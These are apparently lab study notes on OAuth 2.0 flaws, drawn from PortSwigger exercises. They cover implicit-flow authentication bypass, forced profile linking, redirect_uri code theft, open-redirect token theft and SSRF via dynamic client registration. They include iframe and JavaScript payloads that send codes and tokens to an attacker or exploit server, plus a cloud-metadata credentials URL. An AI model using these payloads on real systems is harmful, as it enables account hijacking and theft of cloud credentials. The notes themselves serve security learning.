# Resources
- [Portswigger - Oauth](https://portswigger.net/web-security/oauth)
- [OAuth Authentication Playlist - Michael Sommer](https://www.youtube.com/playlist?list=PL0W_QjMcqdSDySnTew-bKmqIu89ltfqkh)
# Key points
We are talking about OAuth 2.0
We are focusing on the **implicit** and **authorization code** grant types as they are the most common ones
For the authorization code grant type the API requests for the user's data happen in a secure backend channel between the client app and the oauth server
For the implicit grant type the API requests for the user's data happen via browsers redirects and are visible to the user
Do recon of the public API of the OAuth provider to become familiar with it
Some requests to try to find more information:
```html
/.well-known/oauth-authorization-server
/.well-known/openid-configuration
```
- Scope: Defines the data that will be granted accesst to
- State parameter: Used to prevent CSRF attacks
# Vulnerabilities
- Authentication bypass via OAuth implicit flow
    - The application wants to maintain a session, so it sends the OAuth data via a POST request to store the data and send a session cookie
    - The server does not have a secret or password to compare to, so the data sent is implicitly trusted
    - The attacker can manipulate it and access another account
- Forced OAuth profile linking - Link victim's account to attacker's social media
    - Missing `state` parameter
    - Use the `linking-code` generated while associating social-media-profiles:accounts to create a payload (use an iframe) to serve to the victim
    ```html
    src="https://website/oauth-linking?code=STOLEN-CODE"
    ```
- OAuth account hijacking via redirect_uri - Steal victim's authorization code
    - The redirect_uri parameter is not being validated it. Test it with a burp collaborator payload or the exploit server
    - Use a redirection vulnerability to steal the access code to hijack the victim's account. Embed the payload into an iframe
    ```html
    src="https://oauth-server.net/auth?client_id=ID&redirect_uri=https://attacker-server.net&response_type=code&scope=openid%20profile%20email"
    ```
- Stealing OAuth access tokens via an open redirect - Steal victim's access token
    - Test redirect_uri parameter validation mechanism
    - Find a open redirect vulnerability and chain it with path traversal
    - Redirect the user to the exploit server
    - Notice that the access token is returned as a url fragment. The payload has to be crafted to extract it
    ```html
    <script>
        if (!document.location.hash) {
            window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
        } else {
            window.location = '/?'+document.location.hash.substr(1)
        }
    </script>
    ```
    - Steal the access token
- OpenID unprotected dynamic client registration + SSRF
    - Use oauth service providers' commonly known files to gather information
    ```http
    https://oauth-server.com/.well-known/openid-configuration
    ```
    - Extract the registration endpoint
    - Send a POST request to register your own application. The response should return the client-id
    ```http
    {
        "redirect_uris" : [
            "https://example.com"
        ]
    }
    ```
    - Inspect the oauth flow and notice that resources are fetched from /client/client-id/logo
    - Register a new application and add the logo_uri parameter. Test for SSRF by injecting the parameter with the collaborator payload
    ```http
    {
        "redirect_uris" : [
            "https://example.com"
        ],
        "logo_uri" : "https://collaborator-payload"
    }
    ```
    - Once SSRF has been confirmed, send a new registration but this time fetch the instance metadata endpoint to extract cloud sensitive information
    - logo_uri payload:
    ```http
    http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
    ```
    - Make a request to `GET /client/client-id/logo` to retrieve the clould environment data
